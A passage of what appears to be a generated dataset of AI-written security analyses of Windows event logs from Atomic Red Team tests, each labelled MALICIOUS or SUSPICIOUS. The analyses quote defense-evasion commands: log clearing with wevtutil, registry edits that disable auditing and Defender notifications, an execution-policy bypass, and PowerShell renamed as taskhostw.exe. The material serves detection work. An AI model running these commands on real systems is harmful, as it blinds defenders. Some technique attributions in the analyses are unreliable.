   - Multiple processes (`wevtutil.exe`, `cmd.exe`) were executed with a High Integrity Level under `admin_test`, indicating administrative privileges.

**Assessment and Risk**:
The logs exhibit behaviors that align with typical compromise activities, including log clearing, privilege usage, and defense evasion attempts through registry modifications. While no single event conclusively proves a breach, the combination of these actions strongly suggests unauthorized and potentially malicious activity.

**Resolution**: **MALICIOUS**

**Guidance for Proceeding**:
1. **Containment**: Immediately isolate `SERVER002` to prevent further potential damage.
2. **Investigation**: Conduct a thorough investigation to identify how the `admin_test` account was compromised. 
3. **Remediation**: 
   - Change passwords for `admin_test` and other privileged accounts.
   - Review and revise account permissions.
   - Restore event logs if backups are available.
4. **Monitoring and Logging**: Increase monitoring of privileged accounts and review logs for similar patterns across other systems.
5. **Security Enhancements**: Re-enable Windows Defender protections and assess the environment for other disabled security measures.

This analysis should be used to guide further response and investigation actions to ensure the security and integrity of the company's systems."
Disable Powershell ETW Provider - Windows,"### Analysis:

1. **PowerShell and PsExec Execution:**
   - The PowerShell logs contain execution of a command line that involves `PsExec.exe`, a tool commonly used for remote execution.
   - The PowerShell command line contains actions that manipulate event tracing settings, (`logman update trace ""EventLog-Application""`), which can be indicative of attempts to alter logging behavior.
   - The use of `-s` in `PsExec` indicates that the executed process runs under the SYSTEM account, suggesting privilege escalation.

2. **System and Security Logs:**
   - The system logs show evidence of log clearing events (`EventID: 104`). This action is suspicious as it indicates a potential attempt to hide malicious activity.
   - `PSEXESVC` service start from `PsExec.exe` is documented, showing that PsExec was executed on this system.

3. **Sysmon Logs:**
   - The `Sysmon` logs show processes such as `wevtutil.exe` (used to manage event logs) clearing system logs and PowerShell logs, correlating with actions mentioned in the system and security logs.
   - Multiple `conhost.exe` instances indicate console activity, probably related to various command executions, including PowerShell and cmd.

4. **Clear Indicators of Malicious Activity:**
   - Combination of PowerShell execution with `PsExec`, log clearing events, and manipulation of Windows event logs strongly implies nefarious intent.
   - Actions resemble techniques used in post-exploitation frameworks to cover tracks by clearing logs and altering trace settings.
   - The presence of AtomicRedTeam in the directory path forecasts simulation of attack patterns, which are typically used in red team exercises or by attackers modeling after them.

### Assessment:
- **Threats/Risks:** The activities recorded involve behaviors which are generally aligned with malicious intents, such as privilege escalation, event log manipulation (including clearing), and unauthorized use of remote administration tools (PsExec).
- **Impact:** Elevated privileges combined with the ability to clear logs and hinder tracing can result in undetected malicious activities leading to potential data loss, unauthorized access or control over systems, and further propagation of malicious activities within the network.

### Guidance:
- **Investigate Event Sources:** Verify if the actions were authorized or part of a red team exercise. Contact system owners or administrators to confirm.
- **Forensic Analysis:** Conduct a deeper forensic analysis on the host, especially focusing on the timeline and cross-referencing with any alerts or other security systems.
- **Strengthen Monitoring/Logging:** Implement measures to prevent unauthorized clearing of logs and use tamper-proof logging solutions.
- **Identify Potential Breach:** Check for lateral movements or persistence mechanisms which could have been deployed during the activity window.

Regsvr32 local DLL execution,"**Analysis of the logs:**

Upon analysis of the given logs, the following suspicious behaviors and potential indicators of malicious activity are noted:

1. **Log Clearing Events:**
   - Multiple logs (Security, Sysmon, System, and Windows PowerShell) have been systematically cleared. This clearing of logs is typically associated with malicious intent, particularly in hiding traces of unauthorized or malicious activity.
   - The `EventID: 1102` in the Security log denotes that the audit log was cleared by `admin_test` user. Similar events with `EventID: 104` in the System log show that the System and Windows PowerShell logs were also cleared.

2. **Use of `wevtutil.exe`:**
   - There are repeated executions of `wevtutil.exe` with command-line arguments to clear event logs (`cl` command). This is a strong indicator of log tampering, often used to cover tracks after unauthorized or malicious actions.

3. **Execution of Known Defense Evasion Techniques:**
   - The command-line log indicates usage of `regsvr32.exe` with DLL from a suspicious location (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.010\\bin\\AllTheThingsx86.dll`). This execution resembles a technique often used for bypassing security tools and executing malicious code.

4. **Presence of Testing or Malicious Tools:**
   - The mention of `AtomicRedTeam` in the path of DLLs suggests a common adversarial simulation tool used for technique validation, which indicates either a penetration test, a malicious actor attempting red team techniques, or a misconfigured security testing environment operating in a production environment.
   
5. **Process Hashes:**
   - Although specific hashes are not inherently malicious, their presence alongside these logs and activities warrants further investigation to confirm if the executables have been tampered with.

6. **Process Executions:**
   - There is an abundance of process executions within a short time span, often seen in automated scripts for setting up persistence, reconnaissance, or initial exploitation phases.

**Assessment:**
- The cumulative pattern of log clearing activities combined with the execution of `regsvr32.exe` from a suspicious file path strongly indicates attempts to evade detection. The context and circumstances strongly point to the potential compromise of the system.

**Resolution:**
- **MALICIOUS**: The activities observed within the logs are consistent with malicious intent, particularly, attempts to obfuscate and hide artifacts of potentially unauthorized or malicious actions.

SIP (Subject Interface Package) Hijacking via Custom DLL,"After examining the provided Windows event logs, I have identified several elements that may indicate potential malicious activity, especially focusing on command-line executions, service manipulations, and user log-in activities. Here is the detailed analysis:

1. **Log Clearing Activity**: 
   - Multiple logs in the System and Security channels have been cleared by the user ""admin_test"". This is evidenced by the wevtutil.exe command line entries, such as `""C:\\Windows\\system32\\wevtutil.exe"" cl ""System""`, `""cl Security""`, and ""\cl ""Windows PowerShell"". The clearing of log files is a significant red flag as it is often performed by attackers to cover their tracks.

2. **Suspicious PowerShell Execution**:
   - There are several instances of PowerShell being executed with scripts that search through Windows directories for specific file signatures. Examples:
     - `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';` 
     - `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item...`
   - Although these commands themselves do not definitively indicate malicious activity, they could potentially be part of reconnaissance or system inspection being performed by an attacker or a penetration tester.

3. **Command-Line Service Manipulations**:
   - The use of `sc.exe` commands to start services such as `pushtoinstall registration` and `wuauserv` suggest potential attempts to manipulate system services. While these commands can be legitimate, without additional context they might indicate an attempt to execute privilege escalation or persistence strategies.

4. **Registry and Service Changes**:
   - An instance of `regsvr32` executed with a DLL from a temporary directory is noteworthy: `""cmd.exe"" /c regsvr32.exe C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1553.003\\bin\\GTSIPProvider.dll`. 
   - This specific command can be associated with a well-known tactic used by attackers to execute code through DLL registration, known in MITRE ATT&CK framework as a technique for bypassing application whitelisting (T1218.010).

5. **Logged Privileges Elevation**:
   - Multiple events with EventID 4672 indicate that the ""admin_test"" account has received high privileges during multiple logins, simultaneously with log evasion activities.

**Assessment**:
Given the observations, the logs demonstrate behaviors that warrant suspicion, especially due to the sequence of log clearing activities, executing scripts that interact with system files and registry changes through scripting. These activities align with tactics and techniques used by attackers for evading detection, maintaining persistence, and gaining elevated privileges.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Immediate User Account Review**: Scrutinize the ""admin_test"" account's activities, ensuring it has not been compromised. Consider password changes and possible account disabling if unauthorized use is suspected.
2. **Comprehensive Log Analysis**: Conduct a deeper analysis into the cleared log periods. Attempt to recover or find other logs that might shed light on activities during those times.
3. **Increase Monitoring**: Implement enhanced monitoring on the affected systems, especially for further unauthorized PowerShell executions, log clearings, and privilege changes.
4. **IR Team Consultation**: Depending on outcomes, consult with the incident response team to evaluate the need for broader forensic investigation of the system.

Additionally, consider reviewing and potentially hardening the PowerShell execution policies and audit settings to deter similar activities in the future."
Modify RDP-Tcp Initial Program Registry Entry,"Here's a detailed analysis of the logs provided, focusing on potential indicators of malicious activity:

### Summary of Analysis

1. **Log Clearance by `admin_test` User:**
   - The `System`, `Windows PowerShell`, and `Security` event logs were cleared by the user `admin_test`. 
   - The use of `wevtutil.exe` to clear logs (as seen in the `Sysmon` logs) is suspicious, especially when coupled with log clearance events (`EventID 104` in System and `EventID 1102` in Security).
   - Log clearance can be an attempt to cover tracks of malicious activity.

2. **Time Manipulation:**
   - Events related to time changes (`EventID 4616`) showing a back and forth alteration of system time. This can be benign but is often associated with attempts to bypass time-based defenses or hide activities.

3. **Suspicious Command Execution:**
   - A command involving registry modification via `cmd.exe` for `RDP-Tcp InitialProgram` was issued by `admin_test`, which changes the default behavior of RDP sessions by potentially launching `notepad.exe`.
   - Registry changes directly via command line using `reg.exe` with high integrity are highly anomalous and warrant further investigation. 

4. **Privilege Escalation:**
   - `admin_test` user has a variety of privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege`) which can be used for privilege escalation or lateral movement within the network. Privilege escalation is critical for attackers to gain greater access and conduct further operations.

5. **Edge Update Service:**
   - Frequent execution of `MicrosoftEdgeUpdate.exe` under the context of `NT AUTHORITY\\SYSTEM` is noticed, many of these seem to be legitimate update activities, but requires correlation with expected updating schedule or activities as excessive runnings can sometimes be tied to persistence mechanisms or legitimate services being misused.

6. **Abnormal Process Creation:**
   - Processes like `HOSTNAME.EXE`, `wevtutil.exe`, and `whoami.exe` are being executed. The presence of `wevtutil.exe` linked with the log clearance and command executions highlight abnormal use.

### Threat Assessment
The presence of log clearance, time manipulation, unauthorized registry modifications particularly related to RDP settings, and the high-privilege actions of the `admin_test` user signify potentially malicious activities.

### Resolution
**MALICIOUS** - The activities observed in the logs, especially the log clearance and unauthorized registry changes, are strongly indicative of deliberate malicious attempts, likely aiming at maintaining persistence or preparing for further malicious activity.

### Guidance on How to Proceed
- **Immediate Response:**
  - **Investigate User `admin_test`:** Validate the legitimacy of `admin_test`'s actions. Consider this account potentially compromised until cleared.
  - **Forensic Investigation:** Preserve current system state and gather forensic data before it is potentially modified or lost.
  - **Network Segmentation:** Temporarily isolate the affected machine (`Server002`) from the network to prevent potential lateral movement.
  
- **Long-term Actions:**
  - **Audit Other Systems:** Investigate other systems in proximity or on the same network segment for similar activities.
  - **Enhance Monitoring:** Increase monitoring for any further unusual activities, particularly related to log clearance and user privilege escalations.
  - **Review Policies:** Ensure proper logging is enforced and monitor for any future attempts to disable or clear logs.
  
These actions are critical in ensuring identified threats do not escalate and that remediation efforts begin promptly."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"Upon analyzing the provided event logs, a pattern of potentially malicious activity emerges:

### Indicators of Suspicious Behavior:

1. **Frequent Use of `wevtutil.exe` for Clearing Logs:**
   - Multiple instances of the `wevtutil.exe` command-line utility appear across different logs to clear event logs. The specific command used (`cl`) indicates that logs in various channels, including `Security`, `System`, and `Windows PowerShell`, were being cleared.
   - This activity is conducted by the user `admin_test`, which is concerning from a security standpoint because clearing event logs can be an indicator of an attempt to hide tracks of unauthorized or malicious activities.

2. **Registry Changes via `cmd.exe` and `reg.exe`:**
   - The logs show execution of `cmd.exe` with commands to modify the registry, specifically targeting the Windows Defender operational logs to potentially disable them. This could signify intentions to disable security measures or logging mechanisms, which is characteristic of malicious behavior.

3. **Execution of Legitimate Command-Line Utilities:**
   - Several legitimate Windows utilities, such as `whoami.exe`, `hostname.exe`, and others run from command lines. While these utilities can be used benignly, in this context, their execution alongside registry edits and log clearing raises suspicion.

4. **High-Integrity Level and Admin User Involvement:**
   - The actions are performed with high integrity levels, implying administrative privileges which are often a target for privilege escalation attacks. The user `admin_test` is consistency involved, which might suggest that either their credentials were compromised or they are performing activities beyond typical administrative maintenance.

5. **Presence of a Security Event (Event ID 1102):**
   - The logs show the occurrence of Event ID 1102, which indicates the Security log was cleared. This is a strong indicator of an attempt to conceal the activity that occurred prior to the log clearing.

### Assessment:

Given these points, the logs contain several signs of potentially **malicious** activity. Clearing of logs, modification of security-related registry keys, and the use of command-line utilities to manipulate system settings suggest attempts to maintain persistence and hide traces of activity on the system.

### Threats and Risks Identified:

- Possible compromise of administrator account credentials (`admin_test`).
- Active measures might be in place to disable or circumvent security software.
- Potentially unauthorized or nefarious activity being masked by log manipulation and registry modifications.

### Guidance and Resolution:

1. **Resolution: MALICIOUS**
   - The actions represented in these logs demonstrate a high likelihood of malicious activity. Immediate action is required to mitigate further risk.

2. **Recommended Actions:**
   - Conduct a detailed forensic analysis on the host to confirm the source and extent of the compromise.
   - Reset credentials for the `admin_test` account and any other potentially affected accounts.
   - Review and enhance logging and monitoring around critical systems and accounts.
   - Perform a comprehensive scan with updated security tools to detect and remove any malware or unauthorized configurations.

3. **Enhancing Security Post-Response:**

Add domain to Trusted sites Zone,"Based on the provided logs, a series of suspicious activities were identified that suggest potential malicious behavior. Here is a detailed analysis:

1. **Security Log:**
   - Event ID 1102 indicates that the security log was cleared by the user ""admin_test"" on Server002. Clearing logs is often associated with an attempt to cover up malicious activities as it prevents security analysts from reviewing what actions took place prior to the log clear.

2. **Windows PowerShell Log:**
   - Several PowerShell events show that a script was executed attempting to modify the Windows registry to add entries under a domain ""bad-domain.com"" with the ""bad-subdomain."" The script also set multiple properties (`https`, `http`, and wildcard `*`) with values indicating manipulation of Internet zone settings, possibly redirecting or altering security settings to weaken protections against this domain. Such actions are indicative of malicious intent to compromise or maintain unauthorized access to the system.

3. **Sysmon Log:**
   - Multiple instances of processes like `wevtutil.exe` were executed by ""SERVER002\admin_test"" which correlate with the clearing of event logs (clearing ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" ""System,"" and ""Security"" logs). This corroborates the hypothesis of an attempt to hide malicious actions.
   - Moreover, the execution of PowerShell processes with intricate command-line activities further signals attempts to obfuscate legitimate activity or perform unauthorized changes.

4. **System Log:**
   - The system log confirms the clearing activity for multiple channels, including the System and Windows PowerShell logs, by ""admin_test,"" aligning with findings in the Security and Sysmon logs.

**Assessment:**
While server tasks, updates via Microsoft Edge, and normal operations might appear within standard bounds, the PowerShell executions, registry manipulations, and repeated log-clearing actions present strong indications of a possible compromise of the CEO's machine (""Server002""). These activities suggest rogue administrative action intended to subvert monitoring capabilities and make clandestine configuration changes potentially for further exploitation or data exfiltration.

**Final Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the compromised host (Server002) from the network to prevent further unauthorized activities.
- Conduct a thorough forensic analysis to assess the full scope of the compromise, including data integrity checks and potential lateral movements.
- Change credentials for the compromised and potentially affected accounts, especially ""admin_test.""
- Reinforce security configurations, particularly logging and monitoring settings, and consider enhanced network and endpoint detection solutions.
- Consider placing domain controllers, critical assets, and other high-value servers under heightened surveillance.
- Share findings with relevant security teams and executives to determine further containment actions and communicate the incident to affected stakeholders if significant data exposure is confirmed."
Tamper with Windows Defender ATP using Aliases - PowerShell,"### Detailed Analysis of the Logs

The logs reveal several potentially suspicious activities that are of concern:

1. **Log Clearing Events:**
   - In the logs provided, we observe events in the **System log (EventID 104)** indicating that the log files for System and PowerShell were cleared by a user named `admin_test`. These actions typically erase valuable data that might have been useful for further investigations. Log clearing, unless performed by legitimate administrators under specific maintenance tasks, is often suggestive of an attempt to cover malicious activity.

2. **Security Log Clearing:**
   - The **Security log (EventID 1102)** reflects that logs have been cleared as well. This further compounds the suspicion of an attempt of malicious activity. Clearing security event logs is a serious indicator of a potential breach or unethical activity by a user with administrator rights.

3. **Suspicious PowerShell Activity:**
   - The **PowerShell logs** show execution of PowerShell commands with specific `Set-MpPreference` settings, which are known commands to alter the behavior of Windows Defender. The settings (`-drtm $True, -dbm $True, -dscrptsc $True, -dbaf $True`) are not typical for legitimate administrative tasks and could indicate an attempt to disable or bypass security features.

4. **User Privilege Elevation:**
   - Multiple **Security log (EventID 4672)** entries indicate that the user `admin_test` was granted special privileges. These include privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which are often leveraged by attackers during post-exploitation phases to stealthily move laterally, sustain persistence, disable security tools, or access sensitive information.

5. **System Time Alterations:**
   - **System log (EventID 4616)** shows changes in system time, indicating manipulation which might be an effort to alter timestamp-related evidence. This tactic can make log correlation more difficult and might confuse incident responders regarding the actual sequence of events. 

6. **Processes and Utilization:**
   - The presence of **wevtutil.exe** in the **Sysmon log (EventID 1 and 5)** logs confirms the log clearing activity, and further illustrates the use of command lines meant for clearing specific logs (`Microsoft-Windows-Sysmon/Operational`), which is again indicative of suspicious behavior aimed at covering tracks.
   - Various processes related to Microsoft Edge Update are visible, which seems typical but should be monitored for ensuring it's legitimate “self-update” functionality and not an abused avenue for injecting malicious code.

7. **Windows Defender Status:**
   - **Application log** entries indicate ""SECURITY_PRODUCT_STATE_SNOOZED"" for Windows Defender, which suggests that attempts may have been made to disable or bypass this security solution.

### Assessment
The combination of log clearing events, suspicious PowerShell usage, and Windows Defender status changes suggest a higher likelihood of malicious activities. The cross-reference of user `admin_test` actions and elevated privileges raises the concern of a compromised administrative account.

### Threats/Risks Identified
- Potential compromise of administrative credentials, facilitating unauthorized control over the host.
- Bypassing of security tools to perform malicious actions undetected.
- Tampering with system logs and time to cover tracks, complicating forensic analysis.

### Guidance and Resolution
- **Resolution: MALICIOUS**
- Immediate containment measures should be employed to secure `Server002` and the compromised `admin_test` account.
- Conduct a full forensic investigation to assess the scope of the breach, retrieve volatile memory and other artifacts, and establish a timeline of all suspicious activities.
- Review access permissions and security policies, especially around privileged user operations and PowerShell usage.
- Reinstate comprehensive monitoring and configure alerts for actions that entail privilege elevation, log clearing, and disabling security tools within the environment.
- Consider implementing additional defensive measures like Powershell logging, script block logging, and advanced threat analytics.
"

Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon reviewing the provided logs, several concerns and indications of potentially malicious activities are apparent.

### Suspicious and Anomalous Behaviors

1. **Event Log Clearing**:
   - The logs show multiple `wevtutil.exe` command executions related to clearing event logs (`""C:\\Windows\\system32\\wevtutil.exe"" cl ...`). This includes clearing the Application, Security, and System logs.
   - Specific entries:
     - Security Log: Event ID 1102 indicates the security log was cleared.
     - System Log: Event ID 104 indicates the system log was cleared.
   - The user who executed these actions was `admin_test`, which raises suspicion, as clearing event logs can be a tactic used by attackers to cover their tracks.

2. **PowerShell Script Execution**:
   - A PowerShell command was executed to modify a registry setting: `New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0`. This command disables logging of command-line arguments for process creation, which is usually enabled for enhanced auditing.
   - The utilization of PowerShell in this manner is indicative of obfuscation or preparation for further malicious activity.

3. **Time Manipulation**:
   - There are several Event ID 4616 entries showing changes to the system time. Although changing the system time is not inherently malicious, it can be a part of a larger malicious attempt to evade detection or synchronize timings for coordinated tasks.

4. **Multiple Edge Update Executions**:
   - Numerous Sysmon entries showing the execution of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). While these could be legitimate update processes, their density and frequency in a short period are atypical and warrant a closer look.

5. **High Integrity Level**:
   - The processes are being executed with a high integrity level, suggesting that the user has administrative capabilities on the machine. If `admin_test` was compromised, this could lead to significant control over the system.

### Assessment

Given the evidence, it is clear that the activities observed in these logs should not be dismissed lightly. The combination of event log clearing, suspicious PowerShell usage, potential manipulation of system time, and high integrity level executions points towards activities that are often associated with nefarious purposes.

### Resolution: SUSPICIOUS

- **Actions Needed**:
  1. **Immediate Investigation of User Account**: Confirm if `admin_test` executed these command lines legitimately. If not, there might be a compromise.
  2. **Malware Analysis**: Conduct thorough malware scanning to detect any malicious payloads.
  3. **Log Monitoring and Prevention**: Implement more stringent monitoring and alerting mechanisms for any similar logs being cleared or manipulated.
  4. **Security Policy Review**: Ensure that adequate policies and configurations (e.g., auditing, PowerShell logging) are enforced to prevent such potential attacks.

The situation demands a detailed examination to ascertain the scope of the potentially malicious activity and mitigate any further risk to the organization."
Disable Remote Desktop Anti-Alias Setting Through Registry,"After analyzing the provided log entries, several indicators suggest potential malicious activity:

1. **Log Clearing (Security Log 1102 and System Log 104)**:
    - The event log entries reveal that the event log channels (Security, Sysmon, System, and Windows PowerShell) were cleared. Event ID 1102 in the Security log indicates the Security log was cleared by ""admin_test"". Clearing event logs is a typical evasion technique used by attackers to hide malicious activity.
    - Event IDs 104 in the System logs further show that logs for System and Windows PowerShell channels were also cleared by ""admin_test"". This consistent log clearing behavior across important logs is highly suspicious.

2. **Use of `wevtutil`**:
    - Multiple entries indicating the execution of `wevtutil.exe` used to clear logs: 
      - For instance, commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational` and similar commands that clear specific event logs, also executed by ""admin_test"". The use of `wevtutil` to clear logs further supports evasion attempts.

3. **Registry Modification Attempt**:
    - Detected use of `cmd.exe` and `reg.exe` to modify registry keys associated with Remote Desktop settings. Specifically, `cmd.exe` used with the command `/c reg add ""HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f`. Unauthorized modification of registry settings related to Remote Desktop could indicate preparations for persistence or altering system defenses.

4. **High Integrity Level**:
    - Multiple suspicious actions, such as the clearing of logs and registry modifications, are performed with high integrity levels, suggesting elevated privileges, which are often associated with malicious activity.

5. **Processes Executions**:
    - Frequent and rapid succession of processes like `whoami.exe`, `hostname.exe`, and `conhost.exe` may be part of an enumeration process or obfuscation technique during a compromised session.

Based on these observations, these logs reveal actions that are distinctly suspicious and indicative of potential malicious intent, specifically targeting log evasion and unauthorized configuration changes:

**Resolution**: MALICIOUS

**Guidance**:
1. **Containment**: Immediately isolate the affected system to prevent further unauthorized access or data exfiltration.
2. **Investigation**: Conduct a full forensic investigation on the compromised host to determine the extent of the breach, including memory and disk analysis.
3. **Monitoring**: Enhance monitoring on this host and surrounding systems to detect any lateral movement or further attempts to execute similar commands.
4. **Review Credentials**: Evaluate the credentials used, particularly ""admin_test"", for any unauthorized access or privilege escalation. Consider resetting relevant credentials.
5. **Patch and Harden**: Ensure all systems are patched and unnecessary services are disabled. Strengthen event log policies to reduce log tampering opportunities.
6. **Response Plan**: Review and optimize incident response and recovery plans based on this incident to mitigate future risks."
Change Powershell Execution Policy to Bypass,"Upon reviewing the provided Windows event logs from the CEO's machine, the following observations are made:

1. **Use of `wevtutil.exe` to Clear Logs**:
    - We observe multiple instances of the `wevtutil.exe` command being executed with the `cl` (clear log) option on different event logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This activity is often used by adversaries to cover their tracks by clearing event logs, a known malicious tactic.

2. **Elevation of Execution Policies**:
    - There is a PowerShell command that alters the execution policy (`Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine`). This alteration allows the execution of potentially malicious scripts that might bypass existing security controls. It is suspicious in nature especially if not aligned with standard administrative tasks.

3. **Log File Clearing Events**:
    - Multiple `EventID 104` from the System log, indicating the clearing of logs, and `EventID 1102` from the Security log, further confirm the use of `wevtutil.exe` to clear logs. These events are generally considered malicious unless they are part of known and approved maintenance tasks.

4. **Process Execution Context**:
    - Several critical processes like `wevtutil.exe` and PowerShell are executing under an account, `SERVER002\\admin_test`, with high integrity levels, suggesting administrative privileges were utilized. However, the identity (`admin_test`) should be verified for legitimacy.

5. **Host Network Activities**:
    - Executions of normal system binaries like `hostname.exe`, and `whoami.exe` in isolation do not indicate maliciousness but, combined with log-clearing activities, gives reason for suspicion.

6. **Edge Update Activities**:
    - The `MicrosoftEdgeUpdate.exe` process entries appear normal given they execute under `NT AUTHORITY\\SYSTEM` and involve various routine service and update activities associated with Microsoft Edge updates. These appear to be non-malicious and expected system maintenance activities.

**Assessment**:
Considering the presence of log-clearing commands in conjunction with the alteration of PowerShell execution policies, there are clear indicators of potentially malicious activities. The use of `wevtutil.exe` to clear logs indicates an attempt to hide activities which strongly suggests compromising security of the system. 

**Threats & Risks**:
- The primary threat is the potential compromise of sensitive information or functionality due to unauthorized and undetected activities.
- Risk of further intrusion or damage, as malicious actors may now pivot to other assets within the network.

**Resolution**:
- **MALICIOUS**: The clear logs operation and execution policy alteration are indicative of malicious intent, necessitating immediate interventions.

**Guidance**:
1. Initiate a comprehensive investigation into the account `SERVER002\\admin_test`.
2. Review network logs around the time of these activities for any unauthorized accesses or data exfiltration attempts.
3. Implement enhanced monitoring and alerts for any further use of log-clearing utilities.
4. Audit and potentially revoke privileged access for the identified account until the investigation is complete.
5. Ensure system integrity by verifying and redeploying the affected systems if necessary."

Suppress Win Defender Notifications,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several potentially concerning patterns and behaviors have been identified, which are highlighted below:

1. **Event Log Clearing (Security Event ID 1102 and System Event ID 104):**
   - There are multiple entries indicating the clearing of different event logs, including Security, System, and Windows PowerShell channels. These actions were initiated by a user identified as ""admin_test,"" which raises a red flag for potential malicious activity. Clearing event logs is a common tactic used by attackers to cover tracks.

2. **Privilege Escalation (Security Event ID 4672):**
   - The account ""admin_test"" is observed receiving a variety of elevated privileges, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges allow for significant control and are often sought by attackers aiming to escalate their access level within a system.

3. **Suspicious Use of `wevtutil.exe` (Sysmon Event ID 1 and 5):**
   - The `wevtutil.exe` utility was invoked multiple times, notably clearing various log channels such as Microsoft-Windows-Sysmon/Operational, Application, Security, and System logs. This utility is part of normal Windows operations, but its repeated use to clear logs in quick succession is suspicious.

4. **Registry Modification (Sysmon Event ID 1):**
   - There is an event logging the execution of `cmd.exe` which is making changes to the Windows Defender's registry settings to suppress notifications (`/v Notification_Suppress /t REG_DWORD /d 1 /f`). Modifying registry settings related to security applications can be a sign of malware trying to disable security features.

5. **Time Manipulation (Security Event ID 4616 and System Event ID 1):**
   - Two entries indicate that the system time was systematically altered. Although sometimes legitimate (for instance, during time synchronization), this can also be employed by attackers to manipulate timestamps and hide the timing of their activities.

6. **Obfuscation or Hiding Indicators:**
   - The combination of clearing logs, manipulating time settings, and having elevated privileges indicates potential efforts to conceal malicious activities.

### Assessment

- **Threat Level:** Based on the combination of log clearing, privileges manipulation, and suspicious registry modifications, these activities are highly indicative of potentially malicious activity.

Masquerading - powershell.exe running as taskhostw.exe,"Upon reviewing the provided logs, several activities and indicators point towards potentially malicious behavior, specifically related to privilege escalation and unauthorized command execution:

1. **PowerShell Execution**: Multiple PowerShell events show the execution of `taskhostw.exe` from `C:\\Users\\admin_test\\AppData\\Roaming`. This is suspicious as `taskhostw.exe` is typically not found in this directory — it's attempting to masquerade as a legitimate Windows process, commonly used in living-off-the-land binaries (LOLBins) tactics by attackers.

2. **Command Execution and File Manipulation**: The `Sysmon` log reveals `cmd.exe` executing with the following command line:
   ```
   ""cmd.exe"" /c copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y & cmd.exe /K %APPDATA%\\taskhostw.exe
   ```
   This indicates the unauthorized copying and execution of `PowerShell.exe` as `taskhostw.exe`. Such activities can be indicative of attempts to bypass security controls and execute scripts stealthily.

3. **Clearing of Windows Event Logs**: Multiple entries in the `System` and `Security` logs show that event logs were cleared by a user with the username `admin_test`. This is a common tactic used post-compromise to erase traces of unauthorized activity.

4. **Unusual Executables and Processes**: The log also shows executions of system utilities by `admin_test` which are often used by attackers to gather information and maintain persistence. The execution of `whoami.exe`, `hostname.exe`, and frequent use of `taskhostw.exe`, amongst others, suggest reconnaissance and potential lateral movement.

5. **Security Privileges**: The events indicate the granting of various elevated privileges to `admin_test`, including the ability to assign primary tokens and debug privileges. These are powerful rights frequently exploited to maintain high levels of access and bypass security mechanisms.

6. **Network Logons**: The presence of NTLM logon events by `admin_test` in the `Security` logs from a remote workstation `DESKTOP-3HL5B2P` suggests potential unauthorized remote access.

Based on the analysis of these logs, the activities captured are highly indicative of a compromise involving unauthorized privilege escalation, system manipulation, and potential data exfiltration preparation.

DLP Evasion via Sensitive Data in VBA Macro over email,"After careful analysis of the provided Windows event logs, the following observations and assessments can be made:

### Analysis of Logs:

1. **Sysmon Logs:**
   - **Wevtutil (Eventing Command Line Utility):** The `wevtutil.exe` command is seen clearing event logs. Commands like `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, and `wevtutil.exe cl ""Windows PowerShell""` are executed. This indicates an attempt to cover tracks by clearing event logs, typically suggesting malicious activity.
   - **Frequent Process Execution:** `conhost.exe` appears multiple times as a child process of different executions of `wevtutil.exe`. Its frequent execution, linked with an event clearing operation, aligns with potential malicious intent as it may be used to mask the deletion operations.
   - **Use of `whoami` and `hostname`:** These tools are used for gathering system information, often a precursor to further actions in a security breach context.
   - **PowerShell Execution:** Notably, a PowerShell command attempts to execute `Send-MailMessage` with an attachment referencing a potential malware testing framework like Atomic Red Team (`T1027-Atomic_Test`), indicating potential command and control actions.

2. **System Logs:**
   - **Event Log Cleared (EventID 104):** Several critical logs, including System and Windows PowerShell event logs, were cleared by the user `admin_test` on `SERVER002`. Clearing event logs intentionally is an immediate red flag for malicious activity.

3. **Windows PowerShell Logs:**
   - The commands executed suggest possible attempts to exfiltrate data or test configurations through scripts that might not be typically authorized.

4. **Security Log:**
   - **Log Cleared Indication (EventID 1102):** The Security log was cleared. This is an uncommon administrative action unless for maintenance purposes, which in corporate environments happens during standard procedures, not spontaneously.

### Assessment:
Based on the observations, there is clear evidence of suspicious and potentially malicious behavior:
- Execution of utilities like `wevtutil` to clear logs can be an indicator of an attempt to cover up tracks after conducting unauthorized activities.
- Execution of PowerShell with scripts, potentially involving exfiltration or further compromise activity.
- Clearing of various event logs without preceding system maintenance justification suggests malicious actions.

### Guidance and Recommendations:
- **Immediate Mitigation:** Perform an immediate review and containment action on the CEO machine `SERVER002`. Ensure the system is isolated from the network to limit potential lateral movement.
- **Forensics and Logging:** Collect full disk images and memory snapshots for detailed forensic analysis. Evaluate compromised accounts.
- **Audit Trailing:** Conduct thorough logging on all relevant systems and increase monitoring. Deploy endpoint detection and response (EDR) mechanisms if not already in place.
- **Security Posture Review:** Encourage stronger operational security controls around event log management and PowerShell execution policies. Implement administrative hardening.

### Resolution:
Based on the assessments of the logs indicating attempted log covering actions, potential data exfiltration or unauthorized actions via PowerShell, the activity is conclusively categorized as:
- **MALICIOUS**

